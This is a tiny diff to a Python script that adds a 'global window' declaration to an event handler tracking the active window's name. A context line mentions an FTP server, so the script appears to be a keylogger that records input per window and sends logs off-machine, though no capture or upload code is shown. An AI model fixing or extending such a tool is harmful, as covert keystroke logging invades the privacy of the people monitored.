@@ -42,6 +42,7 @@ or an FTP server
 
 # main
 def _event(event):
+    global window
     try:
         if event.WindowName != window:
             window = event.WindowName
